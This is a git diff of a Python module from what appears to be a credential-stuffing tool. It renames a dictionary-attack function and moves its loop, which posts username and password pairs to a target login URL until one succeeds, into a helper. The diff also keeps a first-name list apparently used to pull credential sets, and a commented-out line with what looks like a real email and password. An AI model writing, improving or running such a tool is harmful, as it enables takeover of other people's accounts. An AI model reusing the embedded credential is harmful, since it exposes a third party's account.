@@ -1,7 +1,8 @@
 import requests
 
-from gui.dictionary_attacks.console_view import ConsoleView
-from gui.dictionary_attacks.stopped_manager import is_stopped
+from global_functions import send_request
+from gui.credential_stuffing.console_view import ConsoleView
+from gui.credential_stuffing.stopped_manager import is_stopped
 
 
 class Credentials:
@@ -17,7 +18,8 @@ global_credentials_list = [
     # Credentials("pppbbb616000@gmail.com", "jRez.LZ4J9E!3Du")
 ]
 keywords = [
-    "Liam", "Emma", "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia", "James",
+    # "Liam", "Emma", "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia",
+    "James",
     "Amelia", "Benjamin", "Mia", "William", "Charlotte", "Lucas", "Evelyn", "Henry", "Abigail", "Alexander",
     # "Harper", "Jack", "Ella", "Daniel", "Scarlett", "Matthew", "Aria", "Samuel", "Grace", "Jackson",
     # "Lily", "Sebastian", "Chloe", "Gabriel", "Ella", "Carter", "Nora", "Michael", "Zoey", "Wyatt",
@@ -71,48 +73,15 @@ def set_credentials(query, console_view: ConsoleView, limit=10):
     return credentials_list
 
 
-def dictionary_attack(username_var, password_var, login_success_var, url, headers,
-                      credentials_list, console_view: ConsoleView):
+def credential_stuffing(username_var, password_var, login_success_var, url, headers,
+                        credentials_list, console_view: ConsoleView):
     if len(credentials_list) > 0:
         for credentials in credentials_list:
             if is_stopped():
                 break
 
-            try:
-                trying = "[INFO] Trying password: {} and {}: {}".format(credentials.password, username_var,
-                                                                        credentials.username)
-                console_view.add_text_schedule(trying)
-                print(trying)
-
-                payload = {
-                    username_var: credentials.username,
-                    password_var: credentials.password
-                }
-
-                response = requests.post(url, json=payload, headers=headers)
-
-                if login_success_var in response.text or response.status_code == 200:
-                    success_msg = f"[SUCCESS] Password found: {credentials.password}"
-                    console_view.add_text_schedule(success_msg)
-                    print(success_msg)
-                    return True
-
-                else:
-                    failed_msg = f"[FAILED] Password incorrect"
-                    console_view.add_text_schedule(failed_msg)
-                    print(failed_msg)
-
-            except Exception as e:
-                error_msg = f"[ERROR] Error: {e}"
-                console_view.add_text_schedule(error_msg)
-                print(error_msg)
+            if send_request(username_var, credentials.username, password_var, credentials.password,
+                            login_success_var, url, headers, console_view):
+                return True
 
     return False
-
-# if __name__ == "__main__":
-# success = False
-# for keyword in keywords:
-#     set_credentials(keyword)
-#     success = dictionary_attack(username_variable, password_variable, login_success_variable, url_global, headers_global)
-#     if success: break
-# print("Dictionary Attack Complete")
